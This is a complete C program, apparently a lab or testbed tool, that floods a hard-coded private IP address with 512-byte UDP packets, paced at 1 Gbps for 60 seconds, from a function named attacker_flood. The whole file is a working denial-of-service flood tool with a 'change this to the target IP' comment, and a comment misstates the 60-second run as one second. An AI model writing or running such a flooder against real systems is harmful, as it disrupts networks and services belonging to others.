#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define TARGET_IP "10.247.52.4"  // Change this to the target IP
#define TARGET_PORT 8080         // Target UDP port
#define PACKET_SIZE 512          // 512 bytes per packet
#define BANDWIDTH_LIMIT 1000000000  // 1 Gbps in bits
#define PACKETS_PER_SECOND (BANDWIDTH_LIMIT / (PACKET_SIZE * 8))  // Expected packet rate
#define INTERVAL_NS (1000000000 / PACKETS_PER_SECOND)  // Time per packet in nanoseconds

void precise_sleep(struct timespec *next_time) {
    struct timespec now;
    do {
        clock_gettime(CLOCK_MONOTONIC, &now);
    } while ((now.tv_sec < next_time->tv_sec) ||
             (now.tv_sec == next_time->tv_sec && now.tv_nsec < next_time->tv_nsec));
    
    next_time->tv_nsec += INTERVAL_NS;
    if (next_time->tv_nsec >= 1000000000) {
        next_time->tv_nsec -= 1000000000;
        next_time->tv_sec += 1;
    }
}

void attacker_flood(int duration) {
    int sockfd;
    struct sockaddr_in target_addr;
    char payload[PACKET_SIZE];
    memset(payload, 0xAB, PACKET_SIZE);  // Fill packet with dummy data

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr);

    struct timespec next_time;
    clock_gettime(CLOCK_MONOTONIC, &next_time);

    int packet_count = 0;
    time_t end_time = time(NULL) + duration;

    while (time(NULL) < end_time) {
        sendto(sockfd, payload, PACKET_SIZE, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
        packet_count++;

        precise_sleep(&next_time);

        if (packet_count % 10000 == 0) {
            printf("Sent %d packets at 1 Gbps\n", packet_count);
        }
    }

    close(sockfd);
    printf("Attacker finished.\n");
}

int main() {
    attacker_flood(60);  // Run attack for 1 second
    return 0;
}

